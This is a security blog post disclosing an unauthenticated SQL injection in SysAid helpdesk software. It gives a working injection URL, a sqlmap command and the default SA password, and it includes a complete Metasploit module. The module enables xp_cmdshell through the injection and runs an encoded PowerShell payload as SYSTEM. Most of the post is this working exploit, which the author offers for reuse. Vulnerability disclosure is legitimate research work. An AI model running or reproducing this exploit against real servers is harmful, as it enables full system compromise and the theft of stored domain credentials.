+&lt;h2 id=&quot;the-product&quot;&gt;The product&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.sysaid.com/&quot;&gt;https://www.sysaid.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This is helpdesk software made ofr for managing company support cases, providing remote support, and a bunch of other stuff. This software’s database can contain domain credentials that are encrypted using a hardcoded secret as mentioned in the referenced CVEs. This makes it a high-value target that can give access to a large number of credentials and highly privileged accounts. The vulnerability will give facilitate remote code execution on the server as the SYSTEM user if the default configuration is in use.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-vulnerability&quot;&gt;The vulnerability&lt;/h2&gt;
+
+&lt;p&gt;Sysaid is vulnerable to SQL injection at the following url:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://sysaidserver:8080/api/v1/menu/menu_items?menu=main'WAITFOR+DELAY'0%3a0%3a10'--&amp;amp;all_tree=true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This makes it possible to dump the entire database using for instance SQLMap. To exploit the vulnerability successfully, SQLMap must be provided with a valid JSESSIONID cookie that will be set by the server upon first visit to the site.&lt;/p&gt;
+
+&lt;p&gt;The following SQLMap command will detect and be able to exploit the injection vulnerability to return the user that the database commands are executed as:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u http://sysaidserver:8080/api/v1/menu/menu_items?menu=main*&amp;amp;all_tree=true --cookie=&quot;JSESSIONID=xxx&quot; --current-user 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The database is by default running as SA and can therefore activate &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; to run operating system commands with the privileges of the user the database is running as. By default this user is the SYSTEM user on Windows.&lt;/p&gt;
+
+&lt;p&gt;Also the default “SA” user’s password is “Password1” which can be found in cleartext in the configuration files (CVE-2015-3001)&lt;/p&gt;
+
+&lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hbxL0UvYrdE&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;previous-vulnerabilities-in-sysaid-software&quot;&gt;Previous Vulnerabilities in Sysaid Software&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;SysAid Server Arbitrary File Disclosure (2014-12-23)&lt;/li&gt;
+  &lt;li&gt;Ilient SysAid 8.5.5 Multiple Cross Site Scripting and HTML Injection Vulnerabilities (2012-03-08)&lt;/li&gt;
+  &lt;li&gt;Authenticated Blind SQL injection (2012-11-30)&lt;/li&gt;
+  &lt;li&gt;CVE-2015-2993, CVE-2015-2994, CVE-2015-2995, CVE-2015-2996, CVE-2015-2997, CVE-2015-2998,CVE-2015-2999,CVE-2015-3000,CVE-2015-3001, CVE-2014-9436, CVE-2008-2179, CVE-2007-5259&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;metasploit-module&quot;&gt;Metasploit module&lt;/h2&gt;
+
+&lt;p&gt;I wrote my first “real” Metasploit module to have a simple way to exploit this. As I have little to no experience with writing Metasploit modules and I’m not fluent in Ruby, it is a bit of a hack. But it should work and I hope someone can make use of it, I know I will the next time I encounter one of these installations..&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/hland/metasploitmodules/raw/fcabc17fb0bd00bf3a095f68fe8e1457b8407103/sysaid_sqli.rb&quot;&gt;Exploit&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'msf/core/exploit/powershell'
+require 'msf/core/exploit/mssql_commands'
+
+
+class Metasploit3 &amp;lt; Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::HttpClient
+
+
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           =&amp;gt; &quot;Sysaid Helpdesk Software Unauthenticated SQLi&quot;,
+      'Description'    =&amp;gt; %q{
+        This module exploits an unauthenticated SQLi vulnerability in the Sysaid 
+        Helpdesk Free software. Because the &quot;menu&quot; parameter is not handled correctly,
+        a malicious user can manipulate the SQL query, and allows
+        arbitrary code execution under the context of 'SYSTEM' because the database
+        runs as the SA user. This module uses a Metasploit generated Powershell payload and 
+	uses xp_cmdshell, which is activated and then deactivated after exploitation.
+      },
+      'License'        =&amp;gt; MSF_LICENSE,
+      'Author'         =&amp;gt;
+        [
+          'Hland', 
+        ],
+      'References'     =&amp;gt;
+        [
+          ['CVE', 'xxxx'],
+        ],
+      'Payload'        =&amp;gt;
+        {
+          'BadChars' =&amp;gt; &quot;\x00&quot;
+        },
+      'DefaultOptions'  =&amp;gt;
+        {
+          'InitialAutoRunScript' =&amp;gt; 'migrate -f'
+        },
+      'Platform'       =&amp;gt; 'win',
+      'Targets'        =&amp;gt;
+        [
+          ['Sysaid Helpdesk &amp;lt;= v14.4.32 b25', {}]
+        ],
+      'Privileged'     =&amp;gt; false,
+      'DisclosureDate' =&amp;gt; &quot;Aug 29 2015&quot;,
+      'DefaultTarget'  =&amp;gt; 0,
+
+))
+
+      register_options(
+        [
+          OptPort.new('RPORT',     [true, &quot;The web application's port&quot;, 8080]),
+          OptString.new('TARGETURI', [true, 'The base path to to the web application', '/'])
+        ], self.class)
+  end
+
+  def check
+
+    peer = &quot;#{rhost}:#{rport}&quot;
+    uri = target_uri.path
+    uri = normalize_uri(uri,&quot;Login.jsp&quot;)
+
+    print_status(&quot;#{peer} - Checking for vulnerability&quot;)
+
+    res = send_request_cgi({
+      'method'    =&amp;gt; 'GET',
+      'uri'       =&amp;gt; uri,
+      'vars_get' =&amp;gt; {
+      }
+    })
+
+    v = res.body.scan(/\&amp;lt;title\&amp;gt;SysAid Help Desk Software\&amp;lt;\/title\&amp;gt;/)
+    if not v
+        vprint_error(&quot;Is this even a Sysaid Help Desk?&quot;)
+        return Exploit::CheckCode::Safe
+    else
+        vprint_status(&quot;Identified system as Sysaid Help Desk&quot;)
+	return Exploit::CheckCode::Appears
+
+    end
+
+    return Exploit::CheckCode::Unknown
+
+  end
+
+  def mssql_xpcmdshell(cmd,doprint=false,opts={})
+    force_enable = false
+    begin
+      res = mssql_query(&quot;EXEC master..xp_cmdshell '#{cmd}'&quot;, doprint)
+      #mssql_print_reply(res) if doprint
+
+      return res
+
+    rescue RuntimeError =&amp;gt; e
+      if(e.to_s =~ /xp_cmdshell disabled/)
+        force_enable = true
+        retry
+      end
+      raise e
+    end
+  end
+
+  def exploit
+    peer = &quot;#{rhost}:#{rport}&quot;
+    uri = target_uri.path
+
+    vprint_line(&quot;#{peer} - Getting a session token...&quot;)
+    
+    res = send_request_cgi({
+      'method'    =&amp;gt; 'GET',
+      'uri'       =&amp;gt; normalize_uri(uri, &quot;Login.jsp&quot;),
+      'vars_get' =&amp;gt; {
+      }
+    })
+
+    vprint_line(&quot;#{peer} - Cookie's in the jar...&quot;)
+
+    # Got a cookie, now ready to make exploiting requests
+    if res &amp;amp;&amp;amp; res.code == 200
+        #vprint_line(&quot;#{res.headers}&quot;)
+        cookies = res.get_cookies
+        #vprint_line(&quot;#{cmd_psh_payload(payload.encoded, payload_instance.arch.first)}&quot;)
+    else
+        vprint_line(&quot;No 200 response? I'm outta here&quot;)
+        return
+
+    end
+
+    # Put together the vulnerable URI
+    uri = normalize_uri(uri,&quot;api&quot;,&quot;v1&quot;,&quot;menu&quot;,&quot;menu_items&quot;)
+
+    # Generate powershell payload as an encoded string
+    powershell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:encode_final_payload =&amp;gt; true, :remove_comspec =&amp;gt; true})
+
+    
+
+    #
+    # Inject payload and wait for shell
+    #
+    print_status(&quot;#{peer} - Trying to activate xp_cmdshell and exploit vulnerability&quot;)
+
+    sqli = &quot;main';exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC master..xp_cmdshell '#{powershell_payload}';--&quot;
+    res = send_request_cgi({
+      'method'    =&amp;gt; 'GET',
+      'uri'       =&amp;gt; uri,
+      'cookie'    =&amp;gt; cookies,
+      'vars_get' =&amp;gt; {
+        'menu' =&amp;gt; sqli,
+      }
+    })
+
+
+    # Deactivate XPCmdShell
+    sqli = &quot;main';exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;--&quot;
+    print_status(&quot;#{peer} - Deactivating xp_cmdshell to clean up after ourselves..&quot;)
+
+    res = send_request_cgi({
+      'method'    =&amp;gt; 'GET',
+      'uri'       =&amp;gt; uri,
+      'cookie'    =&amp;gt; cookies,
+      'vars_get' =&amp;gt; {
+        'menu' =&amp;gt; sqli,
+      }
+    })
+
+  end
+end
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hland</name></author><category term="exploit" /><category term="Sysaid" /><category term="SQLi" /><summary type="html">Discovered: June 2015</summary></entry></feed>
